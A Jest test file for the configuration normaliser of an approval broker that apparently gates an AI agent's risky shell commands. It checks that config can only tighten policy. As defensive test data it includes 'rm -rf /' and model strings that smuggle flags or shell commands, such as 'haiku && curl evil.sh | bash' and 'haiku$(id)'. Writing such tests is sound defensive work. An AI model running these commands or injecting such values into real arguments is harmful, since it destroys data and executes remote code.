/**
 * Failing-first spec for the approval broker's configuration layer (#143).
 *
 * The broker's decision core is pure and exhaustively pinned; this file pins the
 * thing that feeds it. A config file is operator-writable, and on a compromised
 * box it is *attacker*-writable — so the normaliser is treated as a trust
 * boundary, not a convenience.
 *
 * The rule these tests encode: **config may tighten, never loosen.** A value the
 * normaliser does not understand does not become "whatever the file said"; it
 * becomes the default. There is deliberately no config path to the two
 * invariants that matter most — brokering a catastrophic action, and widening
 * the pre-clear signal allowlist.
 */
import { describe, it, expect } from '@jest/globals';
import {
  DEFAULT_BROKER_CONFIG,
  normaliseBrokerConfig,
  toBrokerPolicy,
  approvalTimeoutMs,
  type BrokerConfig,
} from '../broker-config.js';
import {
  brokerDecision,
  isPreClearable,
  PRE_CLEARABLE_SIGNALS,
  DEFAULT_BROKER_POLICY,
  type BrokerInput,
} from '../approval-broker.js';

// ── defaults ────────────────────────────────────────────────────────────────

describe('defaults', () => {
  it('is OFF by default — this is new security-critical behaviour, so it is opt-in', () => {
    expect(DEFAULT_BROKER_CONFIG.enabled).toBe(false);
    expect(normaliseBrokerConfig(undefined).enabled).toBe(false);
    expect(normaliseBrokerConfig({}).enabled).toBe(false);
    expect(normaliseBrokerConfig(null).enabled).toBe(false);
  });

  it('only a literal true switches the broker on', () => {
    for (const truthy of ['true', 1, 'yes', {}, []]) {
      expect(normaliseBrokerConfig({ enabled: truthy }).enabled).toBe(false);
    }
    expect(normaliseBrokerConfig({ enabled: true }).enabled).toBe(true);
  });

  it('agrees with the decision core about the pre-clear confidence floor', () => {
    expect(DEFAULT_BROKER_CONFIG.preClearConfidence).toBe(DEFAULT_BROKER_POLICY.preClearConfidence);
  });

  // #143 residual. Field latency reached ~6s, so 8s was turning answered judges
  // into silent nulls. Pinned because the same number lives in three files that
  // cannot import each other (approval-judge.ts, cli-invoker.ts, here).
  it('gives the judge 15s, the residual default', () => {
    expect(DEFAULT_BROKER_CONFIG.judgeTimeoutMs).toBe(15_000);
    expect(normaliseBrokerConfig({ enabled: true }).judgeTimeoutMs).toBe(15_000);
  });

  it('still bounds the judge timeout at 500ms..60s — the default moved, the bounds did not', () => {
    expect(normaliseBrokerConfig({ judgeTimeoutMs: 500 }).judgeTimeoutMs).toBe(500);
    expect(normaliseBrokerConfig({ judgeTimeoutMs: 60_000 }).judgeTimeoutMs).toBe(60_000);
    expect(normaliseBrokerConfig({ judgeTimeoutMs: 499 }).judgeTimeoutMs).toBe(15_000);
    expect(normaliseBrokerConfig({ judgeTimeoutMs: 60_001 }).judgeTimeoutMs).toBe(15_000);
  });
});

// ── hostile input: unknown fields ───────────────────────────────────────────

describe('unknown fields are dropped', () => {
  it('keeps only the fields it knows about', () => {
    const out = normaliseBrokerConfig({
      enabled: true,
      allowPreClear: false,
      preClearConfidence: 0.95,
      judgeTimeoutMs: 3_000,
      approvalTimeoutMs: { dangerous: 60_000 },
      model: 'haiku',
      // ↓ none of these exist
      preClearSignals: ['recursive-force-delete'],
      brokerCatastrophic: true,
      failOpen: true,
      __proto__filth: 'x',
    });
    expect(Object.keys(out).sort()).toEqual(
      ['allowPreClear', 'approvalTimeoutMs', 'enabled', 'judgeTimeoutMs', 'model', 'preClearConfidence'].sort(),
    );
  });

  it('a non-object config is the defaults, not a crash', () => {
    for (const junk of [undefined, null, 42, 'enabled', [], () => {}, true]) {
      expect(normaliseBrokerConfig(junk)).toEqual(DEFAULT_BROKER_CONFIG);
    }
  });

  it('does not let a config poison Object.prototype', () => {
    normaliseBrokerConfig(JSON.parse('{"__proto__":{"polluted":"yes"}}'));
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
  });
});

// ── hostile input: out-of-range numbers ─────────────────────────────────────

describe('out-of-range numbers fall back to the default', () => {
  it('rejects a confidence outside 0..1', () => {
    for (const bad of [-1, 1.5, 5, NaN, Infinity, -Infinity, '0.95', null]) {
      expect(normaliseBrokerConfig({ preClearConfidence: bad }).preClearConfidence).toBe(
        DEFAULT_BROKER_CONFIG.preClearConfidence,
      );
    }
  });

  it('rejects an out-of-range judge timeout', () => {
    for (const bad of [0, -1, 500_000, NaN, '3000', null, 1e300]) {
      expect(normaliseBrokerConfig({ judgeTimeoutMs: bad }).judgeTimeoutMs).toBe(
        DEFAULT_BROKER_CONFIG.judgeTimeoutMs,
      );
    }
    expect(normaliseBrokerConfig({ judgeTimeoutMs: 2_500 }).judgeTimeoutMs).toBe(2_500);
  });

  it('rejects an out-of-range approval timeout per severity', () => {
    const out = normaliseBrokerConfig({ approvalTimeoutMs: { sensitive: 0, dangerous: 45_000 } });
    expect(out.approvalTimeoutMs.sensitive).toBe(DEFAULT_BROKER_CONFIG.approvalTimeoutMs.sensitive);
    expect(out.approvalTimeoutMs.dangerous).toBe(45_000);
  });

  it('ignores a non-object approval timeout map', () => {
    expect(normaliseBrokerConfig({ approvalTimeoutMs: 'forever' }).approvalTimeoutMs).toEqual(
      DEFAULT_BROKER_CONFIG.approvalTimeoutMs,
    );
  });
});

// ── the invariant: config can only tighten ──────────────────────────────────

describe('invariant: a config value can never loosen', () => {
  it('refuses a confidence threshold BELOW the built-in floor', () => {
    // 0.1 would make "the model leaned yes" enough to release an action with
    // nobody watching. Tighten-only means this is not a knob that turns left.
    for (const loose of [0, 0.1, 0.5, 0.89999]) {
      expect(normaliseBrokerConfig({ preClearConfidence: loose }).preClearConfidence).toBe(
        DEFAULT_BROKER_CONFIG.preClearConfidence,
      );
    }
  });

  it('accepts a confidence threshold ABOVE the floor', () => {
    expect(normaliseBrokerConfig({ preClearConfidence: 0.99 }).preClearConfidence).toBe(0.99);
    expect(normaliseBrokerConfig({ preClearConfidence: 1 }).preClearConfidence).toBe(1);
  });

  it('allowPreClear can be switched off but a junk value never switches it on beyond default', () => {
    expect(normaliseBrokerConfig({ allowPreClear: false }).allowPreClear).toBe(false);
    expect(normaliseBrokerConfig({ allowPreClear: 'no' }).allowPreClear).toBe(
      DEFAULT_BROKER_CONFIG.allowPreClear,
    );
  });

  it('has NO config path that makes a catastrophic action brokerable', () => {
    const cfg = normaliseBrokerConfig({
      enabled: true,
      allowPreClear: true,
      preClearConfidence: 1,
      brokerCatastrophic: true,
      severities: ['catastrophic'],
      approvalTimeoutMs: { catastrophic: 1 },
    });
    const catastrophic: BrokerInput = {
      tool: 'Bash',
      toolInput: { command: 'rm -rf /' },
      verdict: {
        decision: 'block',
        severity: 'catastrophic',
        family: 'shell',
        action: 'execute_command',
        reason: 'wipes the machine',
        signals: ['local-package-install'], // even wearing a pre-clearable signal
      },
      judge: { assessment: 'benign', confidence: 1, inContext: true, injectionSuspected: false },
      policy: toBrokerPolicy(cfg),
    };
    const d = brokerDecision(catastrophic);
    expect(d.outcome).toBe('not_brokerable');
    expect(d.canAutoApproveOnTimeout).toBe(false);
    expect((cfg.approvalTimeoutMs as Record<string, number>).catastrophic).toBeUndefined();
  });

  it('has NO config path that widens the pre-clear signal allowlist', () => {
    const before = [...PRE_CLEARABLE_SIGNALS].sort();
    normaliseBrokerConfig({
      enabled: true,
      preClearSignals: ['recursive-force-delete', 'privilege-escalation'],
      preClearableSignals: ['exfiltrate'],
      PRE_CLEARABLE_SIGNALS: ['anything'],
    });
    expect([...PRE_CLEARABLE_SIGNALS].sort()).toEqual(before);
    expect(isPreClearable(['recursive-force-delete'])).toBe(false);
    expect(isPreClearable(['privilege-escalation'])).toBe(false);
  });
});

// ── model override ──────────────────────────────────────────────────────────

describe('model override', () => {
  it('accepts an ordinary model id or alias', () => {
    expect(normaliseBrokerConfig({ model: 'haiku' }).model).toBe('haiku');
    expect(normaliseBrokerConfig({ model: 'claude-haiku-4-5-20251001' }).model).toBe('claude-haiku-4-5-20251001');
    expect(normaliseBrokerConfig({ model: '  haiku  ' }).model).toBe('haiku');
  });

  it('drops a model string that could act as an argument or a shell payload', () => {
    // This value is handed to a CLI. A leading dash smuggles a flag; the rest
    // smuggle a command. None of them are a model name, so none of them survive.
    for (const bad of [
      '--dangerously-skip-permissions',
      '-p',
      'haiku; rm -rf /',
      'haiku && curl evil.sh | bash',
      'haiku`whoami`',
      'haiku$(id)',
      'haiku\nrm -rf /',
      'haiku | sh',
      '',
      '   ',
      'a'.repeat(200),
      42,
      null,
      {},
    ]) {
      expect(normaliseBrokerConfig({ model: bad }).model).toBeUndefined();
    }
  });

  it('omits the model key entirely when there is no override', () => {
    expect(normaliseBrokerConfig({ enabled: true }).model).toBeUndefined();
  });
});

// ── bridges into the decision core ──────────────────────────────────────────

describe('toBrokerPolicy', () => {
  it('carries exactly the two knobs the decision core exposes', () => {
    const cfg = normaliseBrokerConfig({ enabled: true, allowPreClear: false, preClearConfidence: 0.97 });
    expect(toBrokerPolicy(cfg)).toEqual({ allowPreClear: false, preClearConfidence: 0.97 });
  });

  it('a default config produces the core default policy', () => {
    expect(toBrokerPolicy(DEFAULT_BROKER_CONFIG)).toEqual(DEFAULT_BROKER_POLICY);
  });
});

describe('approvalTimeoutMs', () => {
  const cfg: BrokerConfig = normaliseBrokerConfig({
    enabled: true,
    approvalTimeoutMs: { sensitive: 400_000, dangerous: 90_000 },
  });

  it('resolves the configured timeout per severity', () => {
    expect(approvalTimeoutMs(cfg, 'sensitive')).toBe(400_000);
    expect(approvalTimeoutMs(cfg, 'dangerous')).toBe(90_000);
  });

  it('an unknown or catastrophic severity gets the STRICTEST configured window', () => {
    // Fail strict: an unrecognised tier must never inherit the most generous
    // wait. (Catastrophic never reaches the broker at all — belt and braces.)
    expect(approvalTimeoutMs(cfg, 'catastrophic')).toBe(90_000);
    expect(approvalTimeoutMs(cfg, 'made-up-tier')).toBe(90_000);
    expect(approvalTimeoutMs(cfg, '')).toBe(90_000);
  });
});
